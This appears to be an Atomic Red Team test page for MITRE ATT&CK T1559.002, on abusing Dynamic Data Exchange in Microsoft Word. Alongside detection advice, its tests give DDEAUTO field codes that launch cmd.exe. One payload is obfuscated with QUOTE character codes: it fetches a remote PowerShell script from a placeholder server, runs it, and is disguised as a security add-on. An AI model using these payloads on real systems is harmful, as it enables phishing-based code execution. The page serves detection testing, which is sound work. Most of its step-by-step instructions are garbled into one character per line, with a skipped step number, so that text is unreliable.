# T1559.002 - Inter-Process Communication: Dynamic Data Exchange
Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.

Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)

Microsoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Execute Commands
Executes commands via DDE using Microsfot Word

**Supported Platforms:** windows
Run it with these steps!
O
p
e
n
 
M
i
c
r
o
s
o
f
t
 
W
o
r
d




I
n
s
e
r
t
 
t
a
b
 
-
>
 
Q
u
i
c
k
 
P
a
r
t
s
 
-
>
 
F
i
e
l
d




C
h
o
o
s
e
 
=
 
(
F
o
r
m
u
l
a
)
 
a
n
d
 
c
l
i
c
k
 
o
k
.




A
f
t
e
r
 
t
h
a
t
,
 
y
o
u
 
s
h
o
u
l
d
 
s
e
e
 
a
 
F
i
e
l
d
 
i
n
s
e
r
t
e
d
 
i
n
 
t
h
e
 
d
o
c
u
m
e
n
t
 
w
i
t
h
 
a
n
 
e
r
r
o
r
 
"
!
U
n
e
x
p
e
c
t
e
d
 
E
n
d
 
o
f
 
F
o
r
m
u
l
a
"
,
 
r
i
g
h
t
-
c
l
i
c
k
 
t
h
e
 
F
i
e
l
d
,
 
a
n
d
 
c
h
o
o
s
e
 
T
o
g
g
l
e
 
F
i
e
l
d
 
C
o
d
e
s
.




T
h
e
 
F
i
e
l
d
 
C
o
d
e
 
s
h
o
u
l
d
 
n
o
w
 
b
e
 
d
i
s
p
l
a
y
e
d
,
 
c
h
a
n
g
e
 
i
t
 
t
o
 
C
o
n
t
a
i
n
 
t
h
e
 
f
o
l
l
o
w
i
n
g
:




{
D
D
E
A
U
T
O
 
c
:
\
\
w
i
n
d
o
w
s
\
\
s
y
s
t
e
m
3
2
\
\
c
m
d
.
e
x
e
 
"
/
k
 
c
a
l
c
.
e
x
e
"
 
 
}



### Atomic Test #2 - Execute PowerShell script via Word DDE
When the word document opens it will prompt the user to click ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download and execute a powershell script

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
start $PathToAtomicsFolder\T1559.002\bin\DDE_Document.docx
```

Invoke-AtomicTest T1559.002 -TestNumbers 2

### Atomic Test #3 - DDEAUTO

TrustedSec - Unicorn - https://github.com/trustedsec/unicorn

SensePost DDEAUTO - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/

Word VBA Macro

[Dragon's Tail](https://github.com/redcanaryco/atomic-red-team/tree/master/ARTifacts/Adversary/Dragons_Tail)

**Supported Platforms:** windows
Run it with these steps!
1
.
 
O
p
e
n
 
W
o
r
d




2
.
 
I
n
s
e
r
t
 
t
a
b
 
-
>
 
Q
u
i
c
k
 
P
a
r
t
s
 
-
>
 
F
i
e
l
d




3
.
 
C
h
o
o
s
e
 
=
 
(
F
o
r
m
u
l
a
)
 
a
n
d
 
c
l
i
c
k
 
o
k
.




4
.
 
O
n
c
e
 
t
h
e
 
f
i
e
l
d
 
i
s
 
i
n
s
e
r
t
e
d
,
 
y
o
u
 
s
h
o
u
l
d
 
n
o
w
 
s
e
e
 
"
!
U
n
e
x
p
e
c
t
e
d
 
E
n
d
 
o
f
 
F
o
r
m
u
l
a
"




5
.
 
R
i
g
h
t
-
c
l
i
c
k
 
t
h
e
 
F
i
e
l
d
,
 
c
h
o
o
s
e
 
"
T
o
g
g
l
e
 
F
i
e
l
d
 
C
o
d
e
s
"




6
.
 
P
a
s
t
e
 
i
n
 
t
h
e
 
c
o
d
e
 
f
r
o
m
 
U
n
i
c
o
r
n
 
o
r
 
S
e
n
s
e
P
o
s
t




7
.
 
S
a
v
e
 
t
h
e
 
W
o
r
d
 
d
o
c
u
m
e
n
t
.




9
.
 
D
D
E
A
U
T
O
 
c
:
\
\
w
i
n
d
o
w
s
\
\
s
y
s
t
e
m
3
2
\
\
c
m
d
.
e
x
e
 
"
/
k
 
c
a
l
c
.
e
x
e
"




1
0
.
 
D
D
E
A
U
T
O
 
"
C
:
\
\
P
r
o
g
r
a
m
s
\
\
M
i
c
r
o
s
o
f
t
\
\
O
f
f
i
c
e
\
\
M
S
W
o
r
d
\
\
.
.
\
\
.
.
\
\
.
.
\
\
.
.
\
\
w
i
n
d
o
w
s
\
\
s
y
s
t
e
m
3
2
\
\
{
 
Q
U
O
T
E
 
8
7
 
1
0
5
 
1
1
0
 
1
0
0
 
1
1
1
 
1
1
9
 
1
1
5
 
8
0
 
1
1
1
 
1
1
9
 
1
0
1
 
1
1
4
 
8
3
 
1
0
4
 
1
0
1
 
1
0
8
 
1
0
8
 
}
\
\
v
1
.
0
\
\
{
 
Q
U
O
T
E
 
1
1
2
 
1
1
1
 
1
1
9
 
1
0
1
 
1
1
4
 
1
1
5
 
1
0
4
 
1
0
1
 
1
0
8
 
1
0
8
 
4
6
 
1
0
1
 
1
2
0
 
1
0
1
 
}
 
-
w
 
1
 
-
n
o
p
 
{
 
Q
U
O
T
E
 
1
0
5
 
1
0
1
 
1
2
0
 
}
(
N
e
w
-
O
b
j
e
c
t
 
S
y
s
t
e
m
.
N
e
t
.
W
e
b
C
l
i
e
n
t
)
.
D
o
w
n
l
o
a
d
S
t
r
i
n
g
(
'
h
t
t
p
:
/
/
<
s
e
r
v
e
r
>
/
d
o
w
n
l
o
a
d
.
p
s
1
'
)
;
 
#
 
"
 
"
M
i
c
r
o
s
o
f
t
 
D
o
c
u
m
e
n
t
 
S
e
c
u
r
i
t
y
 
A
d
d
-
O
n
"



## Detection
Monitor processes for abnormal behavior indicative of DDE abuse, such as Microsoft Office applications loading DLLs and other modules not typically associated with the application or these applications spawning unusual processes (such as cmd.exe).

OLE and Office Open XML files can be scanned for ‘DDEAUTO', ‘DDE’, and other strings indicative of DDE execution.(Citation: NVisio Labs DDE Detection Oct 2017)